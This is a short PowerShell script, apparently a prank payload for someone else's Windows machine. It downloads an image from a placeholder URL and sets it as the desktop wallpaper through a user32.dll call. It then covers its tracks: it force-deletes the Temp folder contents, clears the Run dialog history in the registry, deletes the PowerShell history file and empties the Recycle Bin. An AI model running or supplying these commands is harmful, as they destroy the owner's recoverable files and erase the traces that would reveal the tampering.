$picture = "UR OWN IMAGE URL"

iwr $picture -OutFile $env:TEMP\image.jpg

$Image = "$env:TEMP\image.jpg"
$code = @'
using System.Runtime.InteropServices; 
namespace Win32 { 
    
    public class Wallpaper { 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); 
         
        public static void SetWallpaper(string thePath) { 
            SystemParametersInfo(20, 0, thePath, 3); 
        }
    }
}
'@

Add-Type $code 
[Win32.Wallpaper]::SetWallpaper($Image)

# Delete contents of Temp folder 
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

# Delete powershell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Delete contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
